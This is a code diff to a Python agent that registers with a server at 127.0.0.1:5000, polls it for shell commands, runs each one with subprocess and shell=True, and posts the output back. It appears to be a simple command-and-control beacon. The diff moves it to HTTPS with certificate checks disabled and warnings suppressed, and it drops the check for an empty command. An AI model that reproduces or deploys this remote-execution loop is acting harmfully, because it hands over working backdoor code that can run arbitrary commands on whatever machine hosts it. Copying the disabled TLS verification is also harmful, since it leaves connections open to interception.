@@ -1,13 +1,15 @@
 import requests
 import time
 import subprocess
+import urllib3
 
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 def register():
     print("Agent started\n")
     print("Registering Agent ... \n")
-    response = requests.get(url="http://127.0.0.1:5000/agent/register")
+    response = requests.get(url="https://127.0.0.1:5000/agent/register", verify=False)
     uuid = response.text
     print("Agent registered with: " + uuid)
     return uuid
@@ -17,7 +19,7 @@ uuid = register()
 
 
 def get_commands():
-    command = requests.get(url="http://127.0.0.1:5000/agent/" + uuid + "/command")
+    command = requests.get(url="https://127.0.0.1:5000/agent/" + uuid + "/command", verify=False)
     cmd = command.text
     command = ""
     get_uuid = ""
@@ -55,10 +57,6 @@ while True:
     cmd, sleep  = get_commands()
     print("Got: " + cmd)
 
-    if cmd == "No command set":
-        print("No command set")
-        continue
-
     result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-    requests.post(url=f"http://127.0.0.1:5000/agent/{uuid}/output", data=result.stdout + result.stderr, headers={"Content-Type": "text/plain"})
+    requests.post(url=f"https://127.0.0.1:5000/agent/{uuid}/output", data=result.stdout + result.stderr, headers={"Content-Type": "text/plain"}, verify=False)
 
